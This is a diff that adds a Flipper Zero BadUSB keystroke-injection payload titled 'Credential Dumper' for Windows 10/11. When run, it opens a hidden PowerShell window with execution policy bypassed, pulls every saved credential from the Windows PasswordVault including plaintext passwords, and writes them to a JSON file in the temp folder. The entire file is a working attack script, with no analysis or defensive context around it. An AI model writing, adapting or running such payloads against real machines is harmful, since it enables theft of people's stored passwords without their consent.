@@ -1,0 +1,21 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Credential Dumper
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+STRING [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+ENTER
+STRING $vault = New-Object Windows.Security.Credentials.PasswordVault
+ENTER
+STRING $creds = $vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
+ENTER
+STRING $creds | Select-Object Resource, UserName, Password | ConvertTo-Json | Out-File "$env:TEMP\creds.json"
+ENTER
+STRING exit
+ENTER
